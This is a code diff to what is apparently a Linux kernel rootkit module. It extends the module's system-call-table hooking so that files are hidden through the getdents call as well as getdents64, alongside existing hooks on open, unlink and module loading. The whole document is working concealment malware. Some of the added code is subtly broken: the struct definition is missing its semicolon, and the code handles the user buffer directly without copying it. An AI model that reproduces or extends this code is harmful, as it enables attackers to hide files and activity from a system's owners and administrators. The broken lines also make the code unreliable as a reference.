@@ -26,6 +26,7 @@ static void hook_port(void);
 // Kernel system call
 int (*kernel_seq_show)(struct seq_file *seq, void *v);
 asmlinkage long (*kernel_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+asmlinkage long (*kernel_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long (*kernel_open)(const char __user *filename, int flags, umode_t mode);
 asmlinkage long (*kernel_unlink)(const char __user *pathname);
 asmlinkage long (*kernel_unlinkat)(int dfd, const char __user * pathname, int flag);
@@ -35,13 +36,14 @@ asmlinkage long (*kernel_init_module)(void __user *  umod,  unsigned long len,
 // Hooked system call
 int hooked_seq_show(struct seq_file *seq, void *v);
 asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count);
+asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
 asmlinkage long hooked_open(const char __user *filename, int flags, umode_t mode);
 asmlinkage long hooked_unlink(const char __user *pathname);
 asmlinkage long hooked_unlinkat(int dfd, const char __user * pathname, int flag);
 asmlinkage long hooked_init_module(void __user *  umod,  unsigned long len, 
                                               const char __user * uargs);
 
-/*************** What file we gonna hide ********************/
+/*************** Properties ********************/
 char *INEXISTFILE = "HIDEAFILEINKERNEL";
 char *INEXISTMONITOR = "SETMONITORPROGRAM";
 char *hidfiles[256];
@@ -52,6 +54,14 @@ int filenum;
 int moni_open;
 int moni_unlink;
 int moni_init_module;
+
+struct linux_dirent {
+   unsigned long  d_ino;     
+   unsigned long  d_off;    
+   unsigned short d_reclen;  
+   char           d_name[];  
+}
+
 
 /*
  * Disable write protection for hook system call table
@@ -67,11 +77,13 @@ static int lkm_init(void)
     
     DISABLE_WRITE_PROTECTION;
     kernel_getdents64 = (void *)syscall_table[__NR_getdents64]; 
+    kernel_getdents = (void *)syscall_table[__NR_getdents]; 
     kernel_open = (void *)syscall_table[__NR_open]; 
     kernel_unlink = (void *)syscall_table[__NR_unlink]; 
     kernel_unlinkat = (void *)syscall_table[__NR_unlinkat]; 
     kernel_init_module = (void *)syscall_table[__NR_init_module]; 
     syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
+    syscall_table[__NR_getdents] = (unsigned long *)hooked_getdents;
     syscall_table[__NR_open] = (unsigned long *)hooked_open;
     syscall_table[__NR_unlink] = (unsigned long *)hooked_unlink;
     syscall_table[__NR_unlinkat] = (unsigned long *)hooked_unlinkat;
@@ -139,6 +151,27 @@ static long hide_file64(char *f_name, struct linux_dirent64 __user *dirp, long c
     return count;
 }
 
+static long hide_file(char *f_name, struct linux_dirent __user *dirp, long count)
+{
+    struct linux_dirent *dp;
+    long cur_addr, cur_reclen, next_addr;
+    
+    for (cur_addr = 0; cur_addr < count; cur_addr += dp->d_reclen) {
+        dp = (struct linux_dirent *)((char *)dirp + cur_addr);
+        
+        if (strncmp(dp->d_name, f_name, strlen(f_name)) == 0) {
+            
+            cur_reclen = dp->d_reclen;                              // Store the current dirent length
+            next_addr = (unsigned long)dp + dp->d_reclen;           // Next address = current+len
+            
+            memmove(dp, (void *)next_addr, (unsigned long)dirp + count - next_addr); 
+            count -= cur_reclen;                                    // Modify the count
+        }
+    }
+
+    return count;
+}
+
 /**
  * @brief A hooked getdents64 for hide the file from filesystem
  * @param fd
@@ -154,6 +187,20 @@ asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user 
     
     for(i=0; i<filenum; i++){
         rv = hide_file64(hidfiles[i], dirp, rv);
+    }
+    
+    return rv;
+}
+
+asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
+{
+    long rv;
+    int i;
+    
+    rv = kernel_getdents(fd, dirp, count);
+    
+    for(i=0; i<filenum; i++){
+        rv = hide_file(hidfiles[i], dirp, rv);
     }
     
     return rv;
@@ -269,6 +316,7 @@ static void lkm_exit(void)
     // Recover the original system call setting
     DISABLE_WRITE_PROTECTION;
     syscall_table[__NR_getdents64] = (unsigned long *)kernel_getdents64;
+    syscall_table[__NR_getdents] = (unsigned long *)kernel_getdents;
     syscall_table[__NR_open] = (unsigned long *)kernel_open;
     syscall_table[__NR_unlink] = (unsigned long *)kernel_unlink;
     syscall_table[__NR_unlinkat] = (unsigned long *)kernel_unlinkat;
